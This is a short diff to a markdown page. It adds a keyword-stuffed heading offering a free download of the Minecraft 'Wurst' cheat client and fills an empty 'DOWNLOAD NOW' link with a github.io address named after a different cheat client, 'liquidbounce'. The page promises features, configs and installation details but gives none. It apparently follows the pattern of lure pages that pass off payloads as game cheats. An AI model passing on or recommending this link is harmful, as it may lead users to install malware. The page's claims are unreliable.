@@ -1,10 +1,10 @@
-
+# download minecraft wurst client for PC | free system requirements minecraft wurst client. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://liquidbounce-javascrip-am62.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
